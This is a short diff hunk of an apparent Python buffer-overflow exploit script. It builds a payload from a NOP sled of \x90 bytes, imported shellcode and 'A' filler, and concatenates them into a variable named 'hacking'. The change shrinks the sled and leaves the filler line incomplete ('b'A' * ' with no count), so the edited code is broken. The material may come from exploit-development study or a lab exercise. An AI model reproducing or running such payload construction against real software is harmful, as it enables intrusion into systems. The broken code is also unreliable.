@@ -4,8 +4,8 @@ import sys
 
 from shellcode import shellcode
 
-noop_sled = b'\x90'*850
-filler = b'A' * 8
+noop_sled = b'\x90'*800
+filler = b'A' * 
 
 hacking = noop_sled + shellcode + filler
 
